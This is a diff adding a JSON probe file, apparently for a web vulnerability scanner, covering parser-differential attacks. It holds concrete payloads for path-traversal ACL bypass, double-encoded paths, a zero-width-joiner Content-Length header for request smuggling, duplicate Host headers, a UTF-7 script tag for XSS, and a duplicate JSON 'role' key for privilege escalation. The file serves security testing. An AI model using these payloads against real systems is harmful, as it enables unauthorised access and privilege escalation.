@@ -1,0 +1,100 @@
+{
+  "category": "parser_differential",
+  "description": "Parser Differentials (PortSwigger Top 10 / 2025, #10 — joernchen). Two HTTP / URL / header / body parsers in the same pipeline (front-end + back-end, WAF + app, framework + library) disagree on the same input. Attacker crafts inputs that one parser sees as benign and the next sees as exploitable — auth bypass, cache key confusion, ACL bypass, smuggling, internal-path access.",
+  "contexts": {
+    "url_path_normalisation_split": {
+      "description": "Front-end parser strips /./ and /../ before routing; back-end leaves them. Or front-end decodes %2e once, back-end twice. Result: /admin/../user reaches /admin on back-end.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Request /public/../admin — observe whether front-end ACL (path-based) is bypassed at back-end. Compare to baseline GET /admin (which should be blocked).",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_status", "status": [403, 404]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {"path_override": "/public/../admin", "manual_chain": true}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Double-encode dot — /admin%252e%252e/secret — front-end sees admin%2e%2e/secret as opaque path, back-end re-decodes to /admin../secret which resolves to /secret.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_status", "status": [403, 404]}
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"path_override": "/admin%252e%252e/secret", "manual_chain": true}
+        }
+      ]
+    },
+    "header_name_differential": {
+      "description": "Header name parsing differs — duplicate Content-Length, mixed-case Transfer-Encoding, whitespace before colon, Unicode-equivalent names. Triggers smuggling, host-confusion, or WAF bypass.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Send header `Conten‍t-Length: 100` (ZWJ inserted) — WAF strips the header (sees ContentLength), origin sees the standard length. Cross-test for smuggling.",
+          "matchers": [
+            {"type": "status", "status": [200, 400]},
+            {"type": "length_delta", "min_delta": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"unsafe_headers": true, "header_inject": {"Conten‍t-Length": "100"}, "manual_chain": true}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Duplicate Host header — `Host: target.com` and `Host: internal.target.com`. Front-end honours first, back-end honours last (or vice versa). Internal routing reached via second Host.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "header_change", "name": "Server", "old": "any", "new": "any"}
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"unsafe_headers": true, "header_inject": {"Host": "internal.target.com"}, "manual_chain": true}
+        }
+      ]
+    },
+    "content_type_charset_differential": {
+      "description": "Content-Type charset parsed differently — one parser uses UTF-8 (default), the next uses charset hint to interpret bytes. Crafted Latin-1 / ISO-8859-7 / UTF-7 body bypasses content filters.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "POST body with Content-Type: application/json; charset=utf-7 — UTF-7-encoded `+ADw-script+AD4-` reaches XSS sink after one parser decodes.",
+          "matchers": [
+            {"type": "reflection", "marker": "+ADw-script+AD4-"},
+            {"type": "word", "words": ["<script>"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 38,
+          "variables": {"content_type": "application/json; charset=utf-7", "manual_chain": true}
+        }
+      ]
+    },
+    "json_parser_differential": {
+      "description": "JSON parser duplicates handle keys differently — first wins, last wins, both retained. Auth check sees `{role:user, role:admin}` as `user`, business logic sees `admin`.",
+      "tech_match": ["express", "django", "flask", "spring", ".net"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"role\":\"user\",\"role\":\"admin\"}",
+          "description": "Submit JSON with duplicated authorisation key — first-wins parser at auth (sees user), last-wins parser at application (sees admin). Privilege escalation.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["admin", "ADMIN", "elevated"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 50,
+          "variables": {"content_type": "application/json", "manual_chain": true}
+        }
+      ]
+    }
+  }
+}
